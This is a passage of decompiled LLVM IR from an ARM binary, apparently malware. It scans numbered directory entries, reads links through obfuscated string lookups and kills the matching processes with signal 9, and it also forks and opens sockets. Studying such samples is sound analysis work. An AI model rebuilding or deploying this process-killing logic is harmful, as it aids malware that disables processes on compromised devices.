  %v2_f4c4 = icmp eq i32 %v0_f4c4, 0
  br i1 %v2_f4c4, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f4c4
  %v2_f4d8 = add i32 %v1_f514, %v2_f3fc
  %v1_f4dc = add i32 %v2_f4d8, -545
  %v2_f4dc = inttoptr i32 %v1_f4dc to i8*
  %v3_f4dc = load i8, i8* %v2_f4dc, align 1
  %v2_f4e0 = icmp eq i8 %v3_f4dc, 0
  br i1 %v2_f4e0, label %dec_label_pc_f510, label %bb134

bb134:                                            ; preds = %dec_label_pc_f4d0
  %v8_f4e4 = icmp eq i8 %v3_f4dc, 32
  br i1 %v8_f4e4, label %dec_label_pc_f510, label %dec_label_pc_f4ec

dec_label_pc_f4ec:                                ; preds = %bb134
  %v2_f4ec = add i32 %v1_f514, %v1_f470
  br label %dec_label_pc_f4f0

dec_label_pc_f4f0:                                ; preds = %bb135, %dec_label_pc_f4ec
  %v0_f4fc28 = phi i32 [ %v1_f4fc, %bb135 ], [ %v1_f514, %dec_label_pc_f4ec ]
  %v0_f4f0 = phi i32 [ %v1_f4f0, %bb135 ], [ %v2_f4ec, %dec_label_pc_f4ec ]
  %v1_f4f0 = add i32 %v0_f4f0, 1
  %v2_f4f0 = inttoptr i32 %v1_f4f0 to i8*
  %v3_f4f0 = load i8, i8* %v2_f4f0, align 1
  %v2_f4f4 = icmp eq i8 %v3_f4f0, 0
  br i1 %v2_f4f4, label %.thread27, label %bb135

.thread27:                                        ; preds = %dec_label_pc_f4f0
  %v1_f4fc29 = add i32 %v0_f4fc28, 1
  br label %dec_label_pc_f504

bb135:                                            ; preds = %dec_label_pc_f4f0
  %v8_f4f8 = icmp eq i8 %v3_f4f0, 32
  %v1_f4fc = add i32 %v0_f4fc28, 1
  br i1 %v8_f4f8, label %dec_label_pc_f504, label %dec_label_pc_f4f0

dec_label_pc_f504:                                ; preds = %bb135, %.thread27
  %v1_f50c = phi i32 [ %v1_f4fc29, %.thread27 ], [ %v1_f4fc, %bb135 ]
  %v2_f50c = add i32 %v1_f50c, %v2_f3fc
  br label %dec_label_pc_f510

dec_label_pc_f510:                                ; preds = %dec_label_pc_f4d0, %bb134, %dec_label_pc_f504
  %v2_f51c = phi i32 [ %v2_f4d8, %dec_label_pc_f4d0 ], [ %v2_f4d8, %bb134 ], [ %v2_f50c, %dec_label_pc_f504 ]
  %v2_f514 = add i32 %v1_f514, %v1_f470
  store i32 %v2_f514, i32* @r4, align 4
  %v3_f51c = add i32 %v2_f51c, -545
  %v4_f51c = inttoptr i32 %v3_f51c to i8*
  store i8 0, i8* %v4_f51c, align 1
  %v1_f520 = inttoptr i32 %v2_f514 to i8*
  %v2_f520 = call i32 @function_13a08(i8* %v1_f520)
  %v8_f528 = icmp sgt i32 %v2_f520, 15
  br i1 %v8_f528, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f510
  %v0_f530 = load i32, i32* @r4, align 4
  %v2_f534 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f534, i32* @r0, align 4
  %v2_f538 = bitcast i32* %stack_var_-52 to i8*
  %v3_f538 = call i32 @function_13a30(i8* %v2_f538, i32 %v0_f530)
  br label %dec_label_pc_f53c

dec_label_pc_f53c.loopexit:                       ; preds = %dec_label_pc_f39c.backedge, %dec_label_pc_f39c.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre97 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_f53c

dec_label_pc_f53c:                                ; preds = %dec_label_pc_f53c.loopexit, %dec_label_pc_f52c
  %v1_f54c.pre-phi = phi i8* [ %.pre97, %dec_label_pc_f53c.loopexit ], [ %v2_f538, %dec_label_pc_f52c ]
  %v2_f548.pre-phi = phi i32 [ %.pre, %dec_label_pc_f53c.loopexit ], [ %v2_f534, %dec_label_pc_f52c ]
  %v0_f53c = load i32, i32* @r8, align 4
  %v1_f540 = call i32 @close(i32 %v0_f53c)
  %v2_f54c = call i32 @function_13a08(i8* %v1_f54c.pre-phi)
  store i32 %v2_f54c, i32* @r4, align 4
  %v2_f550 = icmp eq i32 %v2_f54c, 0
  br i1 %v2_f550, label %dec_label_pc_f7a0, label %dec_label_pc_f558

dec_label_pc_f558:                                ; preds = %dec_label_pc_f53c
  %v3_f560 = call i32 @function_13000(i32 6, i32* null)
  %v4_f560 = inttoptr i32 %v3_f560 to i8*
  %v3_f564 = call %__dirstream* @opendir(i8* %v4_f560)
  %v5_f564 = ptrtoint %__dirstream* %v3_f564 to i32
  store i32 %v5_f564, i32* @r8, align 4
  %v2_f568 = icmp eq %__dirstream* %v3_f564, null
  br i1 %v2_f568, label %dec_label_pc_f798, label %dec_label_pc_f578.preheader

dec_label_pc_f578.preheader:                      ; preds = %dec_label_pc_f558
  store i32 0, i32* @r5, align 4
  %v0_f57c44 = call i32 @_readdir()
  %v2_f58046 = icmp eq i32 %v0_f57c44, 0
  br i1 %v2_f58046, label %dec_label_pc_f78c, label %dec_label_pc_f588.preheader.lr.ph

dec_label_pc_f588.preheader.lr.ph:                ; preds = %dec_label_pc_f578.preheader
  %v2_f5b8 = bitcast i32* %stack_var_-4677 to i8*
  %v1_f724 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_f588.preheader

dec_label_pc_f578.loopexit:                       ; preds = %dec_label_pc_f590, %dec_label_pc_f5a4, %dec_label_pc_f60c
  %v0_f57c = call i32 @_readdir()
  %v2_f580 = icmp eq i32 %v0_f57c, 0
  br i1 %v2_f580, label %dec_label_pc_f78c, label %dec_label_pc_f588.preheader

dec_label_pc_f588.preheader:                      ; preds = %dec_label_pc_f588.preheader.lr.ph, %dec_label_pc_f578.loopexit
  %v0_f59092 = phi i32 [ %v0_f57c44, %dec_label_pc_f588.preheader.lr.ph ], [ %v0_f57c, %dec_label_pc_f578.loopexit ]
  br label %dec_label_pc_f588

dec_label_pc_f588:                                ; preds = %dec_label_pc_f588.preheader, %dec_label_pc_f774
  %v0_f59c = phi i32 [ %v0_f59092, %dec_label_pc_f588.preheader ], [ %v0_f780, %dec_label_pc_f774 ]
  %v0_f588 = load i32, i32* @r5, align 4
  %v2_f588 = icmp eq i32 %v0_f588, 0
  br i1 %v2_f588, label %dec_label_pc_f590, label %dec_label_pc_f78c

dec_label_pc_f590:                                ; preds = %dec_label_pc_f588
  %v1_f590 = add i32 %v0_f59c, 11
  %v2_f590 = inttoptr i32 %v1_f590 to i8*
  %v3_f590 = load i8, i8* %v2_f590, align 1
  %v4_f590 = zext i8 %v3_f590 to i32
  %v1_f594 = add nsw i32 %v4_f590, -48
  store i32 %v1_f590, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_f594, 9
  br i1 %tmp, label %dec_label_pc_f578.loopexit, label %dec_label_pc_f5a4

dec_label_pc_f5a4:                                ; preds = %dec_label_pc_f590
  %v3_f5ac = call i32 @function_13000(i32 6, i32* null)
  store i32 %v2_f2d0, i32* @r0, align 4
  %v3_f5b8 = call i32 @function_13a30(i8* %v2_f5b8, i32 %v3_f5ac)
  %v2_f5c0 = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f5c4 = load i32, i32* @r7, align 4
  %v0_f5c8 = load i32, i32* @sl, align 4
  %v2_f5c8 = add i32 %v0_f5c8, %v2_f5c0
  store i32 %v2_f5c8, i32* @r0, align 4
  %v2_f5cc = inttoptr i32 %v2_f5c8 to i8*
  %v3_f5cc = call i32 @function_13a30(i8* %v2_f5cc, i32 %v0_f5c4)
  %v2_f5d4 = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f5d8 = load i32, i32* @r5, align 4
  store i32 %v2_f5d4, i32* %r4.global-to-local, align 4
  %v2_f5e4 = inttoptr i32 %v0_f5d8 to i32*
  %v3_f5e4 = call i32 @function_13000(i32 7, i32* %v2_f5e4)
  %v0_f5ec = load i32, i32* @sl, align 4
  %v2_f5ec = add i32 %v2_f5d4, %v0_f5ec
  store i32 %v2_f5ec, i32* @r0, align 4
  %v2_f5f0 = inttoptr i32 %v2_f5ec to i8*
  %v3_f5f0 = call i32 @function_13a30(i8* %v2_f5f0, i32 %v3_f5e4)
  %v3_f600 = call i32 @_readlink(i32 %v2_f2d0, i32 %v2_f2e4, i32 4096)
  %v7_f604 = icmp eq i32 %v3_f600, -1
  br i1 %v7_f604, label %dec_label_pc_f578.loopexit, label %dec_label_pc_f60c

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f5a4
  %v0_f60c = load i32, i32* @r5, align 4
  %v2_f614 = inttoptr i32 %v0_f60c to i32*
  %v3_f614 = call i32 @function_13000(i32 6, i32* %v2_f614)
  store i32 %v2_f2d0, i32* @r0, align 4
  %v3_f620 = call i32 @function_13a30(i8* %v2_f5b8, i32 %v3_f614)
  %v2_f628 = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f62c = load i32, i32* @r7, align 4
  %v0_f630 = load i32, i32* @sl, align 4
  %v2_f630 = add i32 %v0_f630, %v2_f628
  store i32 %v2_f630, i32* @r0, align 4
  %v2_f634 = inttoptr i32 %v2_f630 to i8*
  %v3_f634 = call i32 @function_13a30(i8* %v2_f634, i32 %v0_f62c)
  %v2_f63c = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f640 = load i32, i32* @r5, align 4
  store i32 %v2_f63c, i32* %r4.global-to-local, align 4
  %v2_f64c = inttoptr i32 %v0_f640 to i32*
  %v3_f64c = call i32 @function_13000(i32 9, i32* %v2_f64c)
  %v0_f654 = load i32, i32* @sl, align 4
  %v2_f654 = add i32 %v2_f63c, %v0_f654
  store i32 %v2_f654, i32* @r0, align 4
  %v2_f658 = inttoptr i32 %v2_f654 to i8*
  %v3_f658 = call i32 @function_13a30(i8* %v2_f658, i32 %v3_f64c)
  %v3_f660 = call %__dirstream* @opendir(i8* %v2_f5b8)
  %v5_f660 = ptrtoint %__dirstream* %v3_f660 to i32
  store i32 %v5_f660, i32* %sb.global-to-local, align 4
  %v2_f664 = icmp eq %__dirstream* %v3_f660, null
  br i1 %v2_f664, label %dec_label_pc_f578.loopexit, label %dec_label_pc_f66c.preheader

dec_label_pc_f66c.preheader:                      ; preds = %dec_label_pc_f60c
  %v0_f67040 = call i32 @_readdir()
  store i32 %v0_f67040, i32* @r6, align 4
  %v2_f67442 = icmp eq i32 %v0_f67040, 0
  br i1 %v2_f67442, label %dec_label_pc_f774, label %dec_label_pc_f684thread-pre-split

dec_label_pc_f66c.loopexit:                       ; preds = %dec_label_pc_f68c, %dec_label_pc_f724
  %v0_f670 = call i32 @_readdir()
  store i32 %v0_f670, i32* @r6, align 4
  %v2_f674 = icmp eq i32 %v0_f670, 0
  br i1 %v2_f674, label %dec_label_pc_f774, label %dec_label_pc_f684thread-pre-split

dec_label_pc_f684thread-pre-split:                ; preds = %dec_label_pc_f66c.preheader, %dec_label_pc_f66c.loopexit
  %v0_f684.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f684thread-pre-split, %dec_label_pc_f74c
  %v0_f684 = phi i32 [ %v0_f684.pr, %dec_label_pc_f684thread-pre-split ], [ 1, %dec_label_pc_f74c ]
  %v2_f684 = icmp eq i32 %v0_f684, 0
  br i1 %v2_f684, label %dec_label_pc_f68c, label %dec_label_pc_f774

dec_label_pc_f68c:                                ; preds = %dec_label_pc_f684
  %v2_f68c = call i32 @function_13aa8(i32 %v2_f2e4, i32 4096)
  %v0_f690 = load i32, i32* @r5, align 4
  %v2_f698 = inttoptr i32 %v0_f690 to i32*
  %v3_f698 = call i32 @function_13000(i32 6, i32* %v2_f698)
  store i32 %v2_f2d0, i32* @r0, align 4
  %v3_f6a4 = call i32 @function_13a30(i8* %v2_f5b8, i32 %v3_f698)
  %v2_f6ac = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f6b0 = load i32, i32* @r7, align 4
  %v0_f6b4 = load i32, i32* @sl, align 4
  %v2_f6b4 = add i32 %v0_f6b4, %v2_f6ac
  store i32 %v2_f6b4, i32* @r0, align 4
  %v2_f6b8 = inttoptr i32 %v2_f6b4 to i8*
  %v3_f6b8 = call i32 @function_13a30(i8* %v2_f6b8, i32 %v0_f6b0)
  %v2_f6c0 = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f6c4 = load i32, i32* @r5, align 4
  store i32 %v2_f6c0, i32* @r4, align 4
  %v2_f6d0 = inttoptr i32 %v0_f6c4 to i32*
  %v3_f6d0 = call i32 @function_13000(i32 9, i32* %v2_f6d0)
  %v0_f6d8 = load i32, i32* @sl, align 4
  %v1_f6d8 = load i32, i32* @r4, align 4
  %v2_f6d8 = add i32 %v1_f6d8, %v0_f6d8
  store i32 %v2_f6d8, i32* @r0, align 4
  %v2_f6dc = inttoptr i32 %v2_f6d8 to i8*
  %v3_f6dc = call i32 @function_13a30(i8* %v2_f6dc, i32 %v3_f6d0)
  %v2_f6e4 = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f6ec = load i32, i32* @sl, align 4
  %v2_f6ec = add i32 %v0_f6ec, %v2_f6e4
  store i32 %v2_f6ec, i32* @r0, align 4
  %v3_f6f0 = inttoptr i32 %v2_f6ec to i8*
  %v4_f6f0 = call i32 @function_13a30(i8* %v3_f6f0, i32 ptrtoint ([2 x i8]* @global_var_1436c.78 to i32))
  %v2_f6f8 = call i32 @function_13a08(i8* %v2_f5b8)
  %v0_f6fc = load i32, i32* @r6, align 4
  %v1_f6fc = add i32 %v0_f6fc, 11
  %v0_f700 = load i32, i32* @sl, align 4
  %v2_f700 = add i32 %v0_f700, %v2_f6f8
  store i32 %v2_f700, i32* @r0, align 4
  %v2_f704 = inttoptr i32 %v2_f700 to i8*
  %v3_f704 = call i32 @function_13a30(i8* %v2_f704, i32 %v1_f6fc)
  %v3_f714 = call i32 @_readlink(i32 %v2_f2d0, i32 %v2_f2e4, i32 4096)
  %v7_f718 = icmp eq i32 %v3_f714, -1
  br i1 %v7_f718, label %dec_label_pc_f66c.loopexit, label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f68c
  %v2_f724 = call i32 @function_13a08(i8* %v1_f724)
  store i32 %v2_f724, i32* @r1, align 4
  %v4_f738 = call i32 @function_13d5c(i8* %v1_f724, i32 %v2_f724, i32 %v2_f548.pre-phi)
  %v7_f73c = icmp eq i32 %v4_f738, -1
  br i1 %v7_f73c, label %dec_label_pc_f66c.loopexit, label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f724
  %v0_f744 = load i32, i32* @r7, align 4
  %v2_f74c = inttoptr i32 %v0_f744 to i8*
  %v3_f74c = call i32 @function_13b34(i8* %v2_f74c, i32 10)
  %v2_f754 = call i32 @kill(i32 %v3_f74c, i32 9)
  %v0_f75c = call i32 @_readdir()
  store i32 %v0_f75c, i32* @r6, align 4
  %v2_f760 = icmp eq i32 %v0_f75c, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_f760, label %dec_label_pc_f774, label %dec_label_pc_f684

dec_label_pc_f774:                                ; preds = %dec_label_pc_f66c.loopexit, %dec_label_pc_f74c, %dec_label_pc_f684, %dec_label_pc_f66c.preheader
  %v0_f774 = load i32, i32* %sb.global-to-local, align 4
  %v1_f774 = inttoptr i32 %v0_f774 to %__dirstream*
  %v3_f778 = call i32 @closedir(%__dirstream* %v1_f774)
  %v0_f780 = call i32 @_readdir()
  %v2_f784 = icmp eq i32 %v0_f780, 0
  br i1 %v2_f784, label %dec_label_pc_f78c, label %dec_label_pc_f588

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f578.loopexit, %dec_label_pc_f774, %dec_label_pc_f588, %dec_label_pc_f578.preheader
  %v0_f78c = load i32, i32* @r8, align 4
  %v1_f78c = inttoptr i32 %v0_f78c to %__dirstream*
  %v3_f790 = call i32 @closedir(%__dirstream* %v1_f78c)
  %v0_f794 = load i32, i32* @r5, align 4
  %v1_f794 = urem i32 %v0_f794, 256
  br label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %dec_label_pc_f558, %dec_label_pc_f78c
  %storemerge = phi i32 [ %v1_f794, %dec_label_pc_f78c ], [ %v5_f564, %dec_label_pc_f558 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_f79c = call i32 @_sleep(i32 1)
  br label %dec_label_pc_f7a0

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f53c, %dec_label_pc_f798
  %v1_f7a4 = call i32 @function_1302c(i32 6)
  %v1_f7ac = call i32 @function_1302c(i32 7)
  %v1_f7b4 = call i32 @function_1302c(i32 9)
  br label %dec_label_pc_f7b8

dec_label_pc_f7b8:                                ; preds = %dec_label_pc_f36c, %dec_label_pc_f7a0
  %v0_f7b8 = load i32, i32* @r4, align 4
  %v2_f7c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f7c4, i32* @r4, align 4
  store i32 %v6_f2bc, i32* @r5, align 4
  store i32 %v9_f2bc, i32* @r6, align 4
  store i32 %v12_f2bc, i32* @r7, align 4
  store i32 %v15_f2bc, i32* @r8, align 4
  store i32 %v21_f2bc, i32* @sl, align 4
  ret i32 %v0_f7b8

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f4ac
  %v1_f7c8 = add i32 %v0_f7c8, 1
  %v7_f7cc = icmp eq i32 %v0_f7c8, 0
  br i1 %v7_f7cc, label %dec_label_pc_f7d4, label %dec_label_pc_f4b4

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7c8
  %v1_f7d4 = add i32 %v0_f4bc, 3
  %v2_f7d4 = inttoptr i32 %v1_f7d4 to i8*
  %v3_f7d4 = load i8, i8* %v2_f7d4, align 1
  %v7_f7d8 = icmp eq i8 %v3_f7d4, 65
  br i1 %v7_f7d8, label %dec_label_pc_f7e8, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_f7d4
  br label %dec_label_pc_f484.backedge

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_f7d4
  store i32 %v1_f7c8, i32* @r4, align 4
  br label %dec_label_pc_f484.backedge

dec_label_pc_f484.backedge:                       ; preds = %.thread33, %dec_label_pc_f7e8, %dec_label_pc_f4b8
  %v0_f4c483 = phi i32 [ %v1_f7c8, %dec_label_pc_f7e8 ], [ %v0_f4c484, %dec_label_pc_f4b8 ], [ %v0_f4c484, %.thread33 ]
  %v0_f7c872 = phi i32 [ %v1_f7c8, %dec_label_pc_f7e8 ], [ %v0_f4b8, %dec_label_pc_f4b8 ], [ %v1_f7c8, %.thread33 ]
  %v0_f4ac.pr69 = phi i32 [ 0, %dec_label_pc_f7e8 ], [ %v0_f4ac.pr70, %dec_label_pc_f4b8 ], [ 0, %.thread33 ]
  %v0_f484 = add i32 %v0_f4bc, 1
  %v1_f484 = add i32 %v0_f4bc, 3
  %v2_f484 = inttoptr i32 %v1_f484 to i8*
  %v3_f484 = load i8, i8* %v2_f484, align 1
  %v2_f488 = icmp eq i8 %v3_f484, 0
  %v1_f48c = add i32 %v0_f48c80, 1
  br i1 %v2_f488, label %dec_label_pc_f4c4, label %dec_label_pc_f494

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f2bc
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_f36c

; uselistorder directives
  uselistorder i32 %v1_f48c, { 1, 0 }
  uselistorder i8 %v3_f484, { 1, 0 }
  uselistorder i32 %v0_f4c483, { 1, 0 }
  uselistorder i32 %v1_f7c8, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v0_f780, { 1, 0 }
  uselistorder i32 %v1_f4f0, { 1, 0 }
  uselistorder i32 %v0_f4fc28, { 1, 0 }
  uselistorder i32 %v1_f514, { 0, 3, 1, 2 }
  uselistorder i32 %v0_f4b8, { 1, 0 }
  uselistorder i32 %v0_f48c80, { 1, 0 }
  uselistorder i32 %v0_f7c8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_f4c484, { 1, 2, 0 }
  uselistorder i32 %v1_f48c54, { 1, 0 }
  uselistorder i32 %v2_f470, { 1, 0 }
  uselistorder i32 %v1_f46c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_f42813, { 1, 0, 2 }
  uselistorder i32 %v0_f418, { 1, 0 }
  uselistorder i32 %v1_f3f8, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_f38c, { 1, 2, 0 }
  uselistorder i32* %v3_f32c, { 1, 0, 2 }
  uselistorder i32 %v2_f2e4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 2, 0, 1 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_13b34, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1436c.78 to i32), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @_readlink, { 1, 0 }
  uselistorder i32 ()* @_readdir, { 5, 4, 3, 1, 2, 0, 6 }
  uselistorder %__dirstream* (i8*)* @opendir, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32)* @function_13c60, { 1, 0 }
  uselistorder i32 512, { 4, 0, 1, 5, 6, 2, 3 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 0, 3, 1, 2, 4 }
  uselistorder i32 4096, { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_f484.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7b8, { 1, 0 }
  uselistorder label %dec_label_pc_f7a0, { 1, 0 }
  uselistorder label %dec_label_pc_f798, { 1, 0 }
  uselistorder label %dec_label_pc_f78c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f774, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f684, { 1, 0 }
  uselistorder label %dec_label_pc_f684thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_f66c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f588, { 1, 0 }
  uselistorder label %dec_label_pc_f588.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f578.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f4b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f494, { 1, 0 }
  uselistorder label %dec_label_pc_f438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f39c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_f3ec, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f3b4, { 1, 0 }
  uselistorder label %dec_label_pc_f36c, { 1, 0 }
}

define i32 @function_f828(i32 %arg1) local_unnamed_addr {
dec_label_pc_f828:
  %v3_f828 = load i32, i32* @r4, align 4
  %v6_f828 = load i32, i32* @r5, align 4
  %v9_f828 = load i32, i32* @r6, align 4
  %v12_f828 = load i32, i32* @r7, align 4
  %v15_f828 = load i32, i32* @r8, align 4
  %v18_f828 = load i32, i32* @sb, align 4
  %v21_f828 = load i32, i32* @sl, align 4
  %v24_f828 = load i32, i32* @fp, align 4
  %v2_f838 = call i32 @time(i32* null)
  store i32 %v2_f838, i32* @r7, align 4
  %v0_f840 = call i32 @fork()
  %v7_f844 = icmp eq i32 %v0_f840, -1
  %. = zext i1 %v7_f844 to i32
  %tmp45 = icmp slt i32 %v0_f840, 1
  %storemerge7 = select i1 %tmp45, i32 %., i32 1
  store i32 %storemerge7, i32* @r5, align 4
  %v2_f860 = icmp eq i32 %storemerge7, 0
  store i32 %v0_f840, i32* @global_var_1cdb0.152, align 4
  br i1 %v2_f860, label %dec_label_pc_f878, label %dec_label_pc_f86c

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f828
  store i32 %v3_f828, i32* @r4, align 4
  store i32 %v6_f828, i32* @r5, align 4
  store i32 %v9_f828, i32* @r6, align 4
  store i32 %v12_f828, i32* @r7, align 4
  store i32 %v15_f828, i32* @r8, align 4
  store i32 %v18_f828, i32* @sb, align 4
  store i32 %v21_f828, i32* @sl, align 4
  store i32 %v24_f828, i32* @fp, align 4
  ret i32 %v0_f840

dec_label_pc_f878:                                ; preds = %dec_label_pc_f828
  store i32 2, i32* @r6, align 4
  %v1_f890 = call i32 @function_f2bc(i32 5888)
  %v0_f89c = load i32, i32* @r6, align 4
  %v0_f8a4 = load i32, i32* @r5, align 4
  %v3_f8b0 = call i32 @_socket(i32 %v0_f89c, i32 1, i32 %v0_f8a4)
  unreachable

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v0_f840, { 1, 2, 3, 0 }
}

define i32 @function_ffc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_ffc0:
  store i32 ptrtoint (i32* @global_var_10148.162 to i32), i32* @global_var_1cd08.164, align 4
  %v1_ffcc = load i32, i32* @r0, align 4
  ret i32 %v1_ffcc
}

define i32 @function_ffd8() local_unnamed_addr {
dec_label_pc_ffd8:
  store i32 1, i32* @r4, align 4
  %v3_fff4 = call i32 @_socket(i32 2, i32 1, i32 0)
  unreachable
}

define i32 @function_10148() local_unnamed_addr {
dec_label_pc_10148:
  %stack_var_-16 = alloca i32, align 4
  %v3_10148 = load i32, i32* @r4, align 4
  store i32 %v3_10148, i32* %stack_var_-16, align 4
  %v1_10150 = call i32 @function_130e4(i32 3)
  %v3_1015c = call i32 @function_13000(i32 3, i32* null)
  %v1_10160 = inttoptr i32 %v3_1015c to i8*
  %v2_10160 = call i32 @function_10ebc(i8* %v1_10160)
  store i32 %v2_10160, i32* @r5, align 4
  %v1_1016c = call i32 @function_1302c(i32 3)
  %v0_10170 = load i32, i32* @r5, align 4
  %v2_10170 = icmp eq i32 %v0_10170, 0
  br i1 %v2_10170, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_10148
  ret i32 %v1_1016c

bb5:                                              ; preds = %dec_label_pc_10148
  %v1_1017c = add i32 %v0_10170, 4
  %v2_1017c = inttoptr i32 %v1_1017c to i32*
  %v3_1017c = load i32, i32* %v2_1017c, align 4
  store i32 %v3_1017c, i32* @r4, align 4
  %v0_10180 = call i32 @function_10bd8()
  %v0_10184 = load i32, i32* @r5, align 4
  %v1_10184 = inttoptr i32 %v0_10184 to i8*
  %v2_10184 = load i8, i8* %v1_10184, align 1
  %v3_10184 = zext i8 %v2_10184 to i32
  %v2_10188 = urem i32 %v0_10180, %v3_10184
  %v0_1018c = load i32, i32* @r4, align 4
  %v4_1018c = mul nuw nsw i32 %v2_10188, 4
  %v5_1018c = add i32 %v0_1018c, %v4_1018c
  %v6_1018c = inttoptr i32 %v5_1018c to i32*
  %v7_1018c = load i32, i32* %v6_1018c, align 4
  store i32 %v7_1018c, i32* @global_var_1cdb8.172, align 4
  %v2_10198 = inttoptr i32 %v0_10184 to i32*
  %v3_10198 = call i32 @function_10e98(i32* %v2_10198, i32 %v3_10184)
  %v1_101a0 = call i32 @function_130e4(i32 4)
  %v3_101ac = call i32 @function_13000(i32 4, i32* null)
  %v4_101ac = inttoptr i32 %v3_101ac to i8*
  %v2_101b0 = add i32 %v3_101ac, 1
  %v3_101b0 = inttoptr i32 %v2_101b0 to i8*
  %v4_101b0 = load i8, i8* %v3_101b0, align 1
  %v3_101b4 = load i8, i8* %v4_101ac, align 1
  store i8 %v4_101b0, i8* bitcast (i32* @global_var_1cdb7.173 to i8*), align 4
  store i8 %v3_101b4, i8* bitcast (i32* @global_var_1cdb6.174 to i8*), align 4
  %v2_101cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_101cc, i32* @r4, align 4
  %v1_101d0 = call i32 @function_1302c(i32 4)
  %v0_101d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_101d4, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  %v1_101d4 = load i32, i32* @ip, align 4
  %v2_101d4 = trunc i32 %v1_101d4 to i16
  %v3_101d4 = load i32, i32* @r1, align 4
  %v4_101d4 = inttoptr i32 %v3_101d4 to i16*
  store i16 %v2_101d4, i16* %v4_101d4, align 2
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  ret i32 %v1_101d0

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_101d8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_101d8:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp12 = call i8 @__decompiler_undefined_function_1()
  %tmp18 = call i8 @__decompiler_undefined_function_1()
  %tmp22 = call i8 @__decompiler_undefined_function_1()
  %tmp26 = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp33 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp36 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_101d8 = load i32, i32* @r4, align 4
  store i32 %v3_101d8, i32* %stack_var_-36, align 4
